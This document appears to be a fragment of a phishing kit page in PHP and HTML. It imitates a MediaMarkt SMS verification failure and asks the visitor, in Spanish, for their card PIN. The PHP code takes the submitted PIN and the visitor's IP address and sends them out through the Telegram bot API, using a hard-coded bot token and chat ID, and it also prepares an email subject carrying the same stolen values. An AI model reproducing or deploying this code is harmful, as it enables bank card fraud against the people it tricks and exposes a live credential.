...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (is_numeric($_POST['sms'])) {
		  ...
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			...
			$sms = $_POST['sms'];
			$to = "xxxxxx";
$token = "1483651372:AAF-36a-HpIAFGbGl2sz0GmOC3uyW42vOW0";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-516299079&text=t=" . urlencode($message)."" );
			$subject = "MediaMarketa_SMS : $ip ---> $sms";
                            ...
                            <div class="col-xs-12 col-sm-6 col-sm-offset-3 col-lg-5 col-lg-offset-3 text-center ogilvy-espacioseccion">
                                ...
                                <div id="Panel1" class="ogilvy-subtitular">
                                    ...
                                    <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                        ...
                                        <div style="margin-left: auto; margin-left: auto; text-align: center;"
                                             class="ogilvy-titular">
                                            <span id="concepto" class="descripcionPago" style="font-weight:bold;">FALLA DE VERIFICACIÓN POR SMS </span><br><span
                                                    id="conceptovalor" style="font-weight:normal;">PARA VALIDAR LA OPERACIÓN, INGRESE EL CÓDIGO PIN DE SU TARJETA Y PRESIONE VALIDAR . </span>
                                        </div>
                                    </div>
                                ...
                                <div id="divSubtitularPago" class="ogilvy-subtitular ogilvy-subtitular-grande">
                                    ...
                                    <span id="lbSubTittle" class="subtitulo">ES63 **** 726</span><br>
...
src="https://cdn4.vectorstock.com/i/thumb-large/46/08/hand-finger-entering-pin-code-solid-icon-unlock-vector-15514608.jpg"
                                                ...
                                                <td style="width:370px;" align="left">
                                                    <div class="div_relleno"
                                                        ...
                                                        <span id="GridViewPagoSimple_ctl02_lbDesPagoSimple"
                                                              class="descripcionPago">Código PIN

<input type="text" name="sms"  maxlength="4" class="input-res">
